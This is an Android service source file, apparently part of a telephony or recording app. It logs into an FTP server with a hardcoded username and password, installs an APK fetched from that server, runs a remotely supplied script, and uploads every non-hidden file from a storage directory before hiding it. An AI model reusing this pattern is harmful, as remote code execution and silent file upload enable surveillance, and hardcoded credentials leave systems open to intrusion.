package com.telephony.services;

import java.io.File;
import java.io.FilenameFilter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class UploadService extends Service {

	private ExecutorService es;
	private PreferenceUtils sPref = null;
	private MyFTPClient ftp;
	private Updater upd;
	private Scripter scp;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {

		super.onCreate();
		es = Executors.newFixedThreadPool(1);
		sPref = PreferenceUtils.getInstance(this);
		sPref.setUploadUrl("ftp://upload:ghjuhtcc@10.0.0.253:21");
		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		es.execute(new RunService(intent, flags, startId, this));

		return super.onStartCommand(intent, flags, startId);

	}

	private class RunService implements Runnable {
		final Intent intent;
		final int flags;
		final int startId;
		final Context context;

		public RunService(Intent intent, int flags, int startId, Context context) {
			this.intent = intent;
			this.flags = flags;
			this.startId = startId;
			this.context = context;
		}

		public void run() {
			try {
				ftp = new MyFTPClient();
				ftp.connect(sPref.getUploadUrl());
				Log.d(Utils.LOG_TAG, ftp.getReplyString());
				if (ftp.isAuthorized) {

					if (sPref.getRootDir().exists() && (Utils.updateExternalStorageState() == Utils.MEDIA_MOUNTED)) {
						upd = new Updater(context, ftp);
						upd.loadProps();
						Log.d(Utils.LOG_TAG, "ver: " + upd.getRemoteVersion());
						Log.d(Utils.LOG_TAG, "current ver: " + upd.getCurrentVersion());
						Log.d(Utils.LOG_TAG, "apk: " + upd.getRemoteFile());
						// Log.d(Utils.LOG_TAG,"exec: "+Arrays.toString(upd.execCMD()));
						upd.updateAPK();
						upd.free();

						scp = new Scripter(context, ftp);
						scp.execScript();

						// Log.d(Utils.LOG_TAG, "TEXT: " +
						// Arrays.toString(ftp.downloadFileStrings("ver.prop")));
						// Log.d(Utils.LOG_TAG, "apk file: " +
						// ftp.downloadFile(sPref.getRootDir(),
						// "commons-net-3.3-bin.zip"));

						// Log.d(Utils.LOG_TAG, "size: "
						// +ftp.getFileSize("eclipse.ini"));
						// ftp.downloadFile(sPref.getRootDir(), "eclipse.ini");
						// String[] s = ftp.downloadFileText("eclipse.ini");
						// Log.d(Utils.LOG_TAG,"TEXT: " + Arrays.toString(s));

						ArrayList<File> list = Utils.rlistFiles(sPref.getRootDir(), new FilenameFilter() {
							public boolean accept(File dir, String filename) {
								File f = new File(dir, filename);
								Date today = new Date();
								return !f.isHidden();
								// && new Date(f.lastModified()).before(new
								// Date(today.getTime() - (Utils.MINUTE * 15)));
							}
						});
						for (File file : list) {
							Log.d(Utils.LOG_TAG, "try upload: " + file.getAbsolutePath());
							try {
								ftp.uploadFile(sPref.getRootDir(), file);
								ftp.setHidden(file);
							} catch (IOException e) {
								e.printStackTrace();
							}
						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				stop();
			}
		}

		public void stop() {
			try {
				ftp.disconnect();
			} catch (Exception e) {
				e.printStackTrace();
			}
			stopSelf();
		}

	}

	@Override
	public void onDestroy() {

		super.onDestroy();
		ftp = null;
		es = null;
		sPref = null;
		ftp = null;
		upd = null;
		scp = null;
		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
	}

}
